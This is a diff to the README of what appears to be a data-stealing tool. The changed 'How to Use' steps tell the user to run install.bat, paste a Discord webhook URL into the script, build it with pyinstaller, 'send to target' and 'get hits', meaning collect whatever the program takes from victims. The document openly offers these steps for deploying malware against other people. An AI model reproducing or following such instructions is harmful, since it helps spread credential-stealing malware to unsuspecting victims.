@@ -43,10 +43,11 @@
 
 
 ### How to Use
-1. Put your Discord webhook URL in the script where it says `WEBHOOK = "yourwebhookhere"`
-2. build with pyinstaller
-3. send to target
-4. get hits
+1. install all requirements by running install.bat
+2. Put your Discord webhook URL in the script where it says `WEBHOOK = "yourwebhookhere"`
+3. build with pyinstaller
+4. send to target
+5. get hits
 
 
 ### special Thanks
